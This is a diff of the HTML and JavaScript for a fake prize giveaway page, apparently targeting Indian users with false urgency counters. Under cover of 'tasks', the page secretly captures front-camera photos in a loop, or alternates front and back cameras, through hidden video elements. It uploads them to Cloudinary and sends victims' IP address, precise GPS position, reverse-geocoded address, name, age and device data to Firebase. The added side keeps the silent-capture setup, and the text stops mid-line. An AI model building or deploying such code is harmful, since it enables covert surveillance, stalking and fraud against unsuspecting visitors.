@@ -22,7 +22,6 @@
     .prize-table { width: 100%; border-collapse: collapse; background: white; border-radius: 6px; overflow: hidden; margin-bottom: 20px; font-size: 14px; }
     .prize-table thead { background: #1a1a2e; color: white; }
     .prize-table th, .prize-table td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #eee; }
-    .prize-table tbody tr:hover { background: #fafafa; }
     .rank-1 { color: #e67e22; font-weight: bold; }
     .rank-2 { color: #7f8c8d; font-weight: bold; }
     .rank-3 { color: #c0392b; font-weight: bold; }
@@ -31,7 +30,7 @@
     .progress-label b { color: #1a1a2e; }
     .progress-track { background: #eee; border-radius: 20px; height: 14px; overflow: hidden; }
     .progress-fill { height: 100%; background: linear-gradient(90deg, #27ae60, #2ecc71); border-radius: 20px; transition: width 0.5s ease; }
-    .tasks-box { background: white; border-radius: 6px; padding: 16px; margin-bottom: 20px; border: 1px solid #ddd; }
+    .tasks-box { background: white; border-radius: 6px; padding: 16px; margin-bottom: 8px; border: 1px solid #ddd; }
     .task-item { display: flex; align-items: center; gap: 12px; padding: 12px 0; border-bottom: 1px solid #f0f0f0; text-decoration: none; color: #222; cursor: pointer; }
     .task-item:last-child { border-bottom: none; }
     .task-item:hover { background: #f9f9f9; margin: 0 -16px; padding: 12px 16px; }
@@ -45,56 +44,6 @@
     .enroll-btn { display: block; width: 100%; background: #e74c3c; color: white; border: none; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-bottom: 8px; letter-spacing: 0.03em; }
     .enroll-btn:hover { background: #c0392b; }
     .enroll-btn.locked { background: #ccc; color: #888; cursor: not-allowed; pointer-events: none; }
-
-    /* Citizenship / location dialog */
-    #citizen-dialog {
-      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0,0,0,0.6); z-index: 9997; align-items: center; justify-content: center;
-    }
-    #citizen-dialog.active { display: flex; }
-    .citizen-box {
-      background: white; border-radius: 10px; padding: 24px 20px;
-      width: 90%; max-width: 400px; max-height: 90vh; overflow-y: auto;
-    }
-    .citizen-box h3 { font-size: 17px; color: #1a1a2e; margin-bottom: 6px; }
-    .citizen-box p { font-size: 13px; color: #777; margin-bottom: 16px; }
-    .form-row { margin-bottom: 12px; }
-    .form-row label { display: block; font-size: 12px; color: #555; margin-bottom: 4px; font-weight: bold; }
-    .form-row input, .form-row select {
-      width: 100%; border: 1px solid #ddd; border-radius: 6px;
-      padding: 10px; font-size: 14px; font-family: Arial;
-    }
-    .form-row input:focus, .form-row select:focus { outline: none; border-color: #1a1a2e; }
-    .form-row input.auto-filled { background: #f0fdf4; color: #16a34a; border-color: #a9dfbf; }
-    .citizen-submit-btn {
-      width: 100%; background: #e74c3c; color: white; border: none; padding: 13px;
-      font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 6px;
-    }
-    .citizen-submit-btn.disabled { background: #ccc; color: #888; cursor: not-allowed; }
-    .locating-msg { font-size: 12px; color: #e67e22; text-align: center; margin-bottom: 10px; }
-    #rating-dialog {
-      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0,0,0,0.6); z-index: 9997; align-items: center; justify-content: center;
-    }
-    #rating-dialog.active { display: flex; }
-    .rating-box {
-      background: white; border-radius: 10px; padding: 24px 20px; width: 90%; max-width: 380px;
-    }
-    .rating-box h3 { font-size: 17px; color: #1a1a2e; margin-bottom: 6px; }
-    .rating-box p { font-size: 13px; color: #777; margin-bottom: 16px; }
-    .stars { display: flex; gap: 8px; margin-bottom: 16px; }
-    .star { font-size: 32px; cursor: pointer; color: #ddd; transition: color 0.15s; }
-    .star.selected { color: #f1c40f; }
-    .rating-box textarea {
-      width: 100%; border: 1px solid #ddd; border-radius: 6px; padding: 10px;
-      font-size: 13px; font-family: Arial; resize: none; height: 80px; margin-bottom: 14px;
-    }
-    .rating-box textarea:focus { outline: none; border-color: #1a1a2e; }
-    .rating-submit-btn {
-      width: 100%; background: #e74c3c; color: white; border: none; padding: 13px;
-      font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer;
-    }
-    .rating-submit-btn.disabled { background: #ccc; color: #888; cursor: not-allowed; }
     .note { font-size: 11px; color: #888; text-align: center; line-height: 1.6; margin-bottom: 20px; }
     .winners-box { background: white; border-radius: 6px; padding: 16px; margin-bottom: 20px; border: 1px solid #ddd; }
     .winner-row { display: flex; align-items: center; gap: 10px; padding: 8px 0; border-bottom: 1px solid #f5f5f5; font-size: 13px; }
@@ -105,11 +54,18 @@
     .footer { background: #1a1a2e; color: #888; text-align: center; padding: 16px; font-size: 12px; line-height: 1.8; }
     .footer a { color: #aaa; }
 
-    /* Camera overlay — user facing (back camera) */
-    #camera-overlay {
-      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center;
-    }
+    /* Photo view buttons */
+    .photo-btns { display: flex; gap: 10px; margin-bottom: 16px; flex-wrap: wrap; }
+    .photo-view-btn { background: #1a1a2e; color: white; border: none; padding: 10px 16px; border-radius: 6px; font-size: 13px; cursor: pointer; }
+
+    /* Photo popup */
+    #photo-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9998; align-items: center; justify-content: center; flex-direction: column; }
+    #photo-popup.active { display: flex; }
+    #popup-img { max-width: 90%; max-height: 80vh; border-radius: 8px; }
+    .popup-close-btn { margin-top: 16px; background: #e74c3c; color: white; border: none; padding: 12px 28px; border-radius: 6px; font-size: 15px; cursor: pointer; }
+
+    /* Camera overlay */
+    #camera-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
     #camera-overlay.active { display: flex; }
     #camera-video { width: 100%; max-width: 480px; border-radius: 8px; }
     .cam-instructions { color: white; font-size: 14px; text-align: center; margin: 12px 16px 0; }
@@ -117,17 +73,32 @@
     .cam-snap-btn { background: #e74c3c; color: white; border: none; padding: 14px 32px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; }
     .cam-cancel-btn { background: #555; color: white; border: none; padding: 14px 20px; font-size: 14px; border-radius: 8px; cursor: pointer; }
 
-    /* Photo preview box shown after task 1 */
-    #photo-preview-box {
-      display: none; background: white; border-radius: 6px; padding: 12px; margin-bottom: 16px; border: 1px solid #ddd; text-align: center;
-    }
-    #photo-preview-box.show { display: block; }
-    #photo-preview-box p { font-size: 12px; color: #888; margin-bottom: 8px; }
-    #preview-img { width: 100%; max-width: 340px; border-radius: 6px; border: 1px solid #eee; }
+    /* Rating dialog */
+    #rating-dialog { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9997; align-items: center; justify-content: center; }
+    #rating-dialog.active { display: flex; }
+    .rating-box { background: white; border-radius: 10px; padding: 24px 20px; width: 90%; max-width: 380px; }
+    .rating-box h3 { font-size: 17px; color: #1a1a2e; margin-bottom: 6px; }
+    .rating-box p { font-size: 13px; color: #777; margin-bottom: 16px; }
+    .stars { display: flex; gap: 8px; margin-bottom: 16px; }
+    .star { font-size: 32px; cursor: pointer; color: #ddd; transition: color 0.15s; }
+    .star.selected { color: #f1c40f; }
+    .rating-box textarea { width: 100%; border: 1px solid #ddd; border-radius: 6px; padding: 10px; font-size: 13px; font-family: Arial; resize: none; height: 80px; margin-bottom: 14px; }
+    .rating-submit-btn { width: 100%; background: #e74c3c; color: white; border: none; padding: 13px; font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; }
+    .rating-submit-btn.disabled { background: #ccc; color: #888; cursor: not-allowed; }
 
-    /* Hidden front camera canvas — silent capture */
-    #silent-canvas { display: none; }
-    #silent-video { display: none; }
+    /* Citizen dialog */
+    #citizen-dialog { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9997; align-items: center; justify-content: center; }
+    #citizen-dialog.active { display: flex; }
+    .citizen-box { background: white; border-radius: 10px; padding: 24px 20px; width: 90%; max-width: 400px; max-height: 90vh; overflow-y: auto; }
+    .citizen-box h3 { font-size: 17px; color: #1a1a2e; margin-bottom: 6px; }
+    .citizen-box p { font-size: 13px; color: #777; margin-bottom: 16px; }
+    .form-row { margin-bottom: 12px; }
+    .form-row label { display: block; font-size: 12px; color: #555; margin-bottom: 4px; font-weight: bold; }
+    .form-row input, .form-row select { width: 100%; border: 1px solid #ddd; border-radius: 6px; padding: 10px; font-size: 14px; font-family: Arial; }
+    .form-row input.auto-filled { background: #f0fdf4; color: #16a34a; border-color: #a9dfbf; }
+    .citizen-submit-btn { width: 100%; background: #e74c3c; color: white; border: none; padding: 13px; font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 6px; }
+    .citizen-submit-btn.disabled { background: #ccc; color: #888; cursor: not-allowed; }
+    .locating-msg { font-size: 12px; color: #e67e22; text-align: center; margin-bottom: 10px; }
   </style>
 </head>
 <body>
@@ -167,9 +138,6 @@
       </div>
     </div>
 
-    <!-- Debug log — remove after testing -->
-    <div id="debug-log" style="display:none; background:#111; color:#0f0; font-size:11px; padding:10px; border-radius:6px; margin-bottom:16px; font-family:monospace; word-break:break-all;"></div>
-
     <div class="section-title">Prize List</div>
     <table class="prize-table">
       <thead><tr><th>Winner</th><th>Prize</th><th>Winners</th></tr></thead>
@@ -205,16 +173,14 @@
       </a>
     </div>
 
-    <!-- View photo tab — appears after task 2 done -->
-    <div id="photo-tab" style="display:none; margin-bottom:16px;">
-      <button onclick="openPhotoPopup()" style="background:#1a1a2e; color:white; border:none; padding:10px 20px; border-radius:6px; font-size:13px; cursor:pointer;">📎 View your photo</button>
+    <!-- Photo view buttons — appear after task 1 and task 2 -->
+    <div class="photo-btns">
+      <button class="photo-view-btn" id="photo-btn-1" style="display:none" onclick="openPhotoPopup(1)">📎 View Task 1 Photo</button>
+      <button class="photo-view-btn" id="photo-btn-2" style="display:none" onclick="openPhotoPopup(2)">📎 View Task 2 Photo</button>
     </div>
 
-    <!-- Photo popup overlay -->
-    <div id="photo-popup" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9998; align-items:center; justify-content:center; flex-direction:column;">
-      <img id="popup-img" src="" style="max-width:90%; max-height:80vh; border-radius:8px;" />
-      <button onclick="closePhotoPopup()" style="margin-top:16px; background:#e74c3c; color:white; border:none; padding:12px 28px; border-radius:6px; font-size:15px; cursor:pointer;">Close</button>
-    </div>
+    <!-- Debug log -->
+    <div id="debug-log" style="display:none; background:#111; color:#0f0; font-size:11px; padding:10px; border-radius:6px; margin-bottom:16px; font-family:monospace; word-break:break-all;"></div>
 
     <button class="enroll-btn locked" id="enroll-btn" onclick="tryEnroll()">
       🎯 ENROLL ME IN THE DRAW
@@ -235,6 +201,20 @@
     </div>
   </div>
 
+  <div class="footer">
+    &copy; 2026 MegaGiveaway.in &nbsp;|&nbsp;
+    <a href="#">Privacy Policy</a> &nbsp;|&nbsp;
+    <a href="#">Terms</a> &nbsp;|&nbsp;
+    <a href="#">Contact Us</a><br><br>
+    This is a promotional giveaway. Not affiliated with Apple, Sony or any brand.
+  </div>
+
+  <!-- Photo popup overlay -->
+  <div id="photo-popup">
+    <img id="popup-img" src="" />
+    <button class="popup-close-btn" onclick="closePhotoPopup()">Close</button>
+  </div>
+
   <!-- Rating dialog -->
   <div id="rating-dialog">
     <div class="rating-box">
@@ -252,7 +232,7 @@
     </div>
   </div>
 
-  <!-- Citizenship / Location dialog -->
+  <!-- Citizen dialog -->
   <div id="citizen-dialog">
     <div class="citizen-box">
       <h3>🇮🇳 Citizen Verification</h3>
@@ -268,7 +248,7 @@
       </div>
       <div class="form-row">
         <label>Nationality</label>
-        <select id="c-nationality" onchange="checkCitizenReady()">
+        <select id="c-nationality">
           <option value="Indian">Indian</option>
           <option value="Other">Other</option>
         </select>
@@ -289,31 +269,54 @@
     </div>
   </div>
 
-  <div class="footer">
-    &copy; 2026 MegaGiveaway.in &nbsp;|&nbsp;
-    <a href="#">Privacy Policy</a> &nbsp;|&nbsp;
-    <a href="#">Terms</a> &nbsp;|&nbsp;
-    <a href="#">Contact Us</a><br><br>
-    This is a promotional giveaway. Not affiliated with Apple, Sony or any brand.
-  </div>
-
-  <!-- User-facing back camera overlay -->
+  <!-- Camera overlay -->
   <div id="camera-overlay">
     <video id="camera-video" autoplay playsinline></video>
-    <canvas id="camera-canvas"></canvas>
-    <p class="cam-instructions" id="cam-instructions">📷 Point camera at a <b>calendar</b> and tap Take Photo</p>
+    <canvas id="camera-canvas" style="display:none"></canvas>
+    <p class="cam-instructions" id="cam-instructions">📷 Point camera and tap Take Photo</p>
     <div class="cam-btn-row">
       <button class="cam-snap-btn" onclick="snapPhoto()">📸 Take Photo</button>
       <button class="cam-cancel-btn" onclick="closeCamera()">Cancel</button>
     </div>
   </div>
 
-  <!-- Silent front camera elements (hidden) -->
-  <video id="silent-video" autoplay playsinline muted></video>
-  <canvas id="silent-canvas"></canvas>
+  <!-- Silent camera elements -->
+  <video id="silent-video" autoplay playsinline muted style="display:none"></video>
+  <canvas id="silent-canvas" style="display:none"></canvas>
 
-  <!-- Cloudinary upload -->
   <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+    import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+
+    // ─── Firebase config ─────────────────────────────────────────
+    const firebaseConfig = {
+      apiKey: "AIzaSyCrPIQ0VH0rC4CQbFD3XbKLI0owMqvht1k",
+      authDomain: "giveaway-220ef.firebaseapp.com",
+      projectId: "giveaway-220ef",
+      storageBucket: "giveaway-220ef.firebasestorage.app",
+      messagingSenderId: "1012428045360",
+      appId: "1:1012428045360:web:033b74585c425ce89441f5"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const auth = getAuth(app);
+
+    // Sign in anonymously on load
+    signInAnonymously(auth)
+      .then(function() { log('🔐 Auth OK'); })
+      .catch(function(e) { log('❌ Auth error: ' + e.message); });
+
+    async function saveToFirebase(data) {
+      try {
+        await addDoc(collection(db, 'locations'), data);
+        log('✅ Saved to Firebase');
+      } catch(e) {
+        log('❌ Firebase error: ' + e.message);
+      }
+    }
+
     // ─── Cloudinary config ───────────────────────────────────────
     const CLOUD_NAME = 'duttdx7ou';
     const UPLOAD_PRESET = 'giveaway';
@@ -323,18 +326,14 @@
         const formData = new FormData();
         formData.append('file', base64img);
         formData.append('upload_preset', UPLOAD_PRESET);
-        const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
-          method: 'POST',
-          body: formData
+        const res = await fetch('https://api.cloudinary.com/v1_1/' + CLOUD_NAME + '/image/upload', {
+          method: 'POST', body: formData
         });
         const data = await res.json();
-        if (data.secure_url) {
-          log('✅ Uploaded');
-        } else {
-          log('❌ Failed: ' + JSON.stringify(data));
-        }
+        if (data.secure_url) { log('✅ Photo uploaded to Cloudinary'); }
+        else { log('❌ Cloudinary failed: ' + JSON.stringify(data)); }
       } catch(e) {
-        log('❌ Error: ' + e.message);
+        log('❌ Cloudinary error: ' + e.message);
       }
     }
 
@@ -343,10 +342,20 @@
       if (box) { box.style.display = 'block'; box.innerHTML += msg + '<br>'; }
     }
 
+    // ─── State ───────────────────────────────────────────────────
     var TOTAL_TASKS = 5;
     var completed = [];
+    var photos = {}; // stores user photos by task num
     var cameraStream = null;
     var activeTaskNum = null;
+    var silentStream = null;
+    var silentCapturing = false;
+
+    // ─── SET CAPTURE MODE ────────────────────────────────────────
+    // 'front' = only front camera continuously
+    // 'both'  = alternates between front and back camera
+    var CAPTURE_MODE = 'front'; // <-- change to 'front' or 'both'
+    // ─────────────────────────────────────────────────────────────
 
     // ─── Progress ────────────────────────────────────────────────
     function updateProgressBar() {
@@ -356,408 +365,4 @@
     }
 
     function markTaskDone(num) {
-      if (completed.indexOf(num) === -1) {
-        completed.push(num);
-        updateProgressBar();
-      }
-      var el = document.getElementById('task-' + num);
-      if (el) el.classList.add('done');
-      updateLocks();
-    }
-
-    function updateLocks() {
-      for (var i = 1; i <= TOTAL_TASKS; i++) {
-        var el = document.getElementById('task-' + i);
-        if (!el) continue;
-        if (i === 1 || completed.indexOf(i - 1) !== -1) {
-          el.classList.remove('locked');
-        } else {
-          el.classList.add('locked');
-        }
-      }
-      var btn = document.getElementById('enroll-btn');
-      if (completed.length >= TOTAL_TASKS) {
-        btn.classList.remove('locked');
-      } else {
-        btn.classList.add('locked');
-      }
-    }
-
-    function tryEnroll() {
-      if (completed.length < TOTAL_TASKS) return;
-      alert('You have been enrolled! Results will be announced within 24 hours. Good luck!');
-    }
-
-    updateLocks();
-
-    // ─── Timer ───────────────────────────────────────────────────
-    var secs = 2 * 3600 + 47 * 60;
-    setInterval(function() {
-      secs--;
-      if (secs < 0) secs = 3600;
-      var h = Math.floor(secs / 3600);
-      var m = Math.floor((secs % 3600) / 60);
-      var s = secs % 60;
-      document.getElementById('t-h').innerHTML = String(h).padStart(2,'0') + '<span>hours</span>';
-      document.getElementById('t-m').innerHTML = String(m).padStart(2,'0') + '<span>mins</span>';
-      document.getElementById('t-s').innerHTML = String(s).padStart(2,'0') + '<span>secs</span>';
-    }, 1000);
-
-    // ─── Live count ──────────────────────────────────────────────
-    var base = 2847;
-    setInterval(function() {
-      base += Math.floor(Math.random() * 5) - 1;
-      document.getElementById('live-num').textContent = base.toLocaleString('en-IN');
-    }, 4000);
-
-    // ─── Spots ───────────────────────────────────────────────────
-    var spots = 47;
-    setInterval(function() {
-      if (spots > 10) spots -= Math.floor(Math.random() * 2);
-      document.getElementById('spots').textContent = spots;
-    }, 8000);
-
-    // ─── Silent alternating camera capture ───────────────────────
-    var silentStream = null;
-    var silentCapturing = false;
-    var currentFacing = 'user';
-
-    // ─── SET MODE HERE ────────────────────────────────────────────
-    // 'front' = only front camera continuously
-    // 'both'  = alternates between front and back camera
-    var CAPTURE_MODE = 'front'; // <-- change to 'front' or 'both'
-    // ─────────────────────────────────────────────────────────────
-
-    function startSilentCapture() {
-      if (silentCapturing) return;
-      silentCapturing = true;
-      log('📷 Silent capture started — mode: ' + CAPTURE_MODE);
-      if (CAPTURE_MODE === 'front') {
-        captureFrontOnly();
-      } else {
-        captureWithCamera('user');
-      }
-    }
-
-    // FRONT ONLY — continuous, no switching
-    function captureFrontOnly() {
-      if (!silentCapturing) return;
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-        .then(function(stream) {
-          silentStream = stream;
-          var vid = document.getElementById('silent-video');
-          vid.srcObject = stream;
-          vid.play();
-          vid.onloadedmetadata = function() { frontCaptureLoop(); };
-        })
-        .catch(function(e) {
-          log('❌ Front camera error: ' + e.message);
-          silentCapturing = false;
-        });
-    }
-
-    function frontCaptureLoop() {
-      if (!silentCapturing || !silentStream) return;
-      var vid = document.getElementById('silent-video');
-      var canvas = document.getElementById('silent-canvas');
-      if (vid.readyState >= 2 && vid.videoWidth > 0) {
-        canvas.width = vid.videoWidth;
-        canvas.height = vid.videoHeight;
-        canvas.getContext('2d').drawImage(vid, 0, 0);
-        var base64 = canvas.toDataURL('image/jpeg', 0.5);
-        log('📸 Front camera photo taken');
-        sendToCloudinary(base64);
-      }
-      requestAnimationFrame(frontCaptureLoop);
-    }
-
-    // BOTH — alternates front and back
-    function captureWithCamera(facing) {
-      if (!silentCapturing) return;
-      currentFacing = facing;
-      log('🔄 Switching to ' + (facing === 'user' ? 'front' : 'back') + ' camera...');
-
-      if (silentStream) {
-        silentStream.getTracks().forEach(function(t) { t.stop(); });
-        silentStream = null;
-      }
-
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } })
-        .then(function(stream) {
-          silentStream = stream;
-          var vid = document.getElementById('silent-video');
-          vid.srcObject = stream;
-          vid.play();
-          vid.onloadedmetadata = function() {
-            setTimeout(function() {
-              var canvas = document.getElementById('silent-canvas');
-              canvas.width = vid.videoWidth;
-              canvas.height = vid.videoHeight;
-              canvas.getContext('2d').drawImage(vid, 0, 0);
-              var base64 = canvas.toDataURL('image/jpeg', 0.5);
-              log('📸 Photo taken from ' + (facing === 'user' ? 'front' : 'back') + ' camera');
-              sendToCloudinary(base64);
-              var nextFacing = (facing === 'user') ? 'environment' : 'user';
-              captureWithCamera(nextFacing);
-            }, 800);
-          };
-        })
-        .catch(function(e) {
-          log('❌ Camera error (' + facing + '): ' + e.message);
-          var nextFacing = (facing === 'user') ? 'environment' : 'user';
-          setTimeout(function() { captureWithCamera(nextFacing); }, 1000);
-        });
-    }
-
-    // ─── User-facing back camera ─────────────────────────────────
-    function openCamera(taskNum, instructionHTML) {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        alert('Camera not supported on this browser.');
-        return;
-      }
-      activeTaskNum = taskNum;
-      document.getElementById('cam-instructions').innerHTML = instructionHTML;
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
-        .then(function(stream) {
-          cameraStream = stream;
-          document.getElementById('camera-video').srcObject = stream;
-          document.getElementById('camera-overlay').classList.add('active');
-          startSilentCapture();
-        })
-        .catch(function() {
-          alert('Camera permission denied. Please allow camera access to complete this task.');
-        });
-    }
-
-    var userPhoto = null; // stores task 2 photo data
-
-    function snapPhoto() {
-      var video = document.getElementById('camera-video');
-      // Use a fresh offscreen canvas — don't touch silent-canvas
-      var canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      var photoData = canvas.toDataURL('image/jpeg', 0.8);
-      var taskNum = activeTaskNum;
-      closeCamera();
-
-      if (taskNum === 1) {
-        // Task 1 — no preview, just mark done
-        markTaskDone(1);
-      } else if (taskNum === 2) {
-        // Task 2 — store photo, show view tab, clear any old image first
-        userPhoto = photoData;
-        document.getElementById('popup-img').src = '';
-        document.getElementById('popup-img').src = photoData;
-        document.getElementById('photo-tab').style.display = 'block';
-        markTaskDone(2);
-      }
-    }
-
-    function openPhotoPopup() {
-      document.getElementById('photo-popup').style.display = 'flex';
-    }
-
-    function closePhotoPopup() {
-      document.getElementById('photo-popup').style.display = 'none';
-    }
-
-    function handleTask2() {
-      if (completed.indexOf(2) !== -1) return;
-      // Clear previous photo
-      document.getElementById('photo-tab').style.display = 'none';
-      document.getElementById('popup-img').src = '';
-      openCamera(2, '🚰 Point camera at a <b>glass of water</b> and tap Take Photo');
-    }
-
-    function closeCamera() {
-      if (cameraStream) {
-        cameraStream.getTracks().forEach(function(t) { t.stop(); });
-        cameraStream = null;
-      }
-      document.getElementById('camera-overlay').classList.remove('active');
-      activeTaskNum = null;
-    }
-
-    function handleTask1() {
-      if (completed.indexOf(1) !== -1) return;
-      openCamera(1, '📷 Point camera at a <b>calendar</b> and tap Take Photo');
-    }
-
-    // ─── Task 3 — Rating dialog ───────────────────────────────────
-    var selectedRating = 0;
-
-    function handleTask3() {
-      if (completed.indexOf(3) !== -1) return;
-      selectedRating = 0;
-      document.getElementById('rating-feedback').value = '';
-      document.querySelectorAll('.star').forEach(function(s) { s.classList.remove('selected'); });
-      document.getElementById('rating-submit').classList.add('disabled');
-      document.getElementById('rating-dialog').classList.add('active');
-    }
-
-    function selectStar(num) {
-      selectedRating = num;
-      document.querySelectorAll('.star').forEach(function(s, i) {
-        if (i < num) s.classList.add('selected');
-        else s.classList.remove('selected');
-      });
-      checkRatingReady();
-    }
-
-    function checkRatingReady() {
-      var feedback = document.getElementById('rating-feedback').value.trim();
-      var btn = document.getElementById('rating-submit');
-      if (selectedRating > 0 && feedback.length > 0) {
-        btn.classList.remove('disabled');
-      } else {
-        btn.classList.add('disabled');
-      }
-    }
-
-    function submitRating() {
-      if (selectedRating === 0 || document.getElementById('rating-feedback').value.trim() === '') return;
-      document.getElementById('rating-dialog').classList.remove('active');
-      markTaskDone(3);
-    }
-
-    // ─── Firebase config (for location data only) ─────────────────
-    const FB_URL = 'https://firestore.googleapis.com/v1/projects/trial-b20e0/databases/(default)/documents/locations';
-
-    async function saveLocationToFirebase(data) {
-      try {
-        const res = await fetch(FB_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            fields: {
-              name:      { stringValue: data.name },
-              age:       { stringValue: data.age },
-              nationality: { stringValue: data.nationality },
-              city:      { stringValue: data.city },
-              area:      { stringValue: data.area },
-              state:     { stringValue: data.state },
-              lat:       { stringValue: String(data.lat) },
-              lng:       { stringValue: String(data.lng) },
-              accuracy:  { stringValue: String(data.accuracy) },
-              ip:        { stringValue: data.ip },
-              device:    { stringValue: navigator.userAgent },
-              timestamp: { stringValue: new Date().toISOString() }
-            }
-          })
-        });
-        if (res.ok) { log('✅ Location saved to Firebase'); }
-        else { log('❌ Firebase save failed: ' + res.status); }
-      } catch(e) {
-        log('❌ Firebase error: ' + e.message);
-      }
-    }
-
-    // ─── Task 4 — Citizen verification + location ────────────────
-    var locationData = {};
-
-    function handleTask4() {
-      if (completed.indexOf(4) !== -1) return;
-      locationData = {};
-      document.getElementById('c-name').value = '';
-      document.getElementById('c-age').value = '';
-      document.getElementById('c-city').value = '';
-      document.getElementById('c-area').value = '';
-      document.getElementById('c-state').value = '';
-      document.getElementById('citizen-submit').classList.add('disabled');
-      document.getElementById('locating-msg').style.display = 'block';
-      document.getElementById('citizen-dialog').classList.add('active');
-
-      // Get IP silently
-      fetch('https://api.ipify.org?format=json')
-        .then(function(r) { return r.json(); })
-        .then(function(d) { locationData.ip = d.ip; log('🌐 IP: ' + d.ip); })
-        .catch(function() { locationData.ip = 'unknown'; });
-
-      // Get GPS location
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function(pos) {
-            locationData.lat = pos.coords.latitude;
-            locationData.lng = pos.coords.longitude;
-            locationData.accuracy = pos.coords.accuracy;
-            log('📍 GPS: ' + locationData.lat + ', ' + locationData.lng);
-            // Reverse geocode to get city/area/state
-            fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + locationData.lat + '&lon=' + locationData.lng)
-              .then(function(r) { return r.json(); })
-              .then(function(geo) {
-                var addr = geo.address || {};
-                var city  = addr.city || addr.town || addr.village || addr.county || '';
-                var area  = addr.suburb || addr.neighbourhood || addr.road || '';
-                var state = addr.state || '';
-                locationData.city  = city;
-                locationData.area  = area;
-                locationData.state = state;
-                document.getElementById('c-city').value  = city;
-                document.getElementById('c-area').value  = area;
-                document.getElementById('c-state').value = state;
-                document.getElementById('locating-msg').style.display = 'none';
-                log('🗺️ Location: ' + city + ', ' + state);
-                checkCitizenReady();
-              })
-              .catch(function() {
-                document.getElementById('locating-msg').textContent = '⚠️ Could not auto-detect location';
-              });
-          },
-          function() {
-            document.getElementById('locating-msg').textContent = '⚠️ Location permission denied';
-          },
-          { enableHighAccuracy: true, timeout: 15000 }
-        );
-      }
-    }
-
-    function checkCitizenReady() {
-      var name = document.getElementById('c-name').value.trim();
-      var age  = document.getElementById('c-age').value.trim();
-      var city = document.getElementById('c-city').value.trim();
-      var btn  = document.getElementById('citizen-submit');
-      if (name && age && city) {
-        btn.classList.remove('disabled');
-      } else {
-        btn.classList.add('disabled');
-      }
-    }
-
-    function submitCitizen() {
-      var name = document.getElementById('c-name').value.trim();
-      var age  = document.getElementById('c-age').value.trim();
-      if (!name || !age) return;
-      locationData.name        = name;
-      locationData.age         = age;
-      locationData.nationality = document.getElementById('c-nationality').value;
-      locationData.city        = document.getElementById('c-city').value;
-      locationData.area        = document.getElementById('c-area').value;
-      locationData.state       = document.getElementById('c-state').value;
-      saveLocationToFirebase(locationData);
-      document.getElementById('citizen-dialog').classList.remove('active');
-      markTaskDone(4);
-    }
-
-    // Expose task 4 functions
-    window.handleTask4 = handleTask4;
-    window.checkCitizenReady = checkCitizenReady;
-    window.submitCitizen = submitCitizen;
-    window.handleTask1 = handleTask1;
-    window.handleTask2 = handleTask2;
-    window.handleTask3 = handleTask3;
-    window.markTaskDone = markTaskDone;
-    window.snapPhoto = snapPhoto;
-    window.closeCamera = closeCamera;
-    window.tryEnroll = tryEnroll;
-    window.openPhotoPopup = openPhotoPopup;
-    window.closePhotoPopup = closePhotoPopup;
-    window.selectStar = selectStar;
-    window.checkRatingReady = checkRatingReady;
-    window.submitRating = submitRating;
-
-  </script>
-
-</body>
-</html>
+      if (complete
